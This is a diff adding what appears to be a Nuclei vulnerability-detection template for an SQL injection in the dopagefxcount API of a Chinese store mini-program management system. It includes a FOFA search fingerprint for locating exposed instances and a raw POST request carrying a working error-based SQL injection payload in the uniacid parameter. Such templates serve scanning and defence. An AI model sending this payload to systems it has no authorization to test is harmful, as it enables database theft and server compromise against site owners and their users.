@@ -1,0 +1,29 @@
+id: wannengmendian-dopagefxcount-sql
+
+info:
+  name: "万能门店小程序管理系统 dopagefxcount 接口 SQL 注入"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/comhome/cases/index.html"
+      万能门店小程序管理系统dopagefxcount接口存在SQL注入漏洞。攻击者可利用该漏洞绕过身份验证机制，直接访问后端数据库，导致敏感信息泄露（如管理员后台密码、用户个人信息）。在具备高权限的情况下，可能进一步在服务器上写入恶意文件，从而控制服务器系统权限。
+  reference:
+  - https://mp.weixin.qq.com/s/1KJ7Yn1PYLfRjG5pVLhn4g
+  tags: 万能门店小程序管理系统
+
+
+
+http:
+- raw:
+  - |
+    POST /api/wxapps/dopagefxcount HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('123123')))),3119)-- 123&suid=1
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '4297f44b13955235245b2497399d7a93'
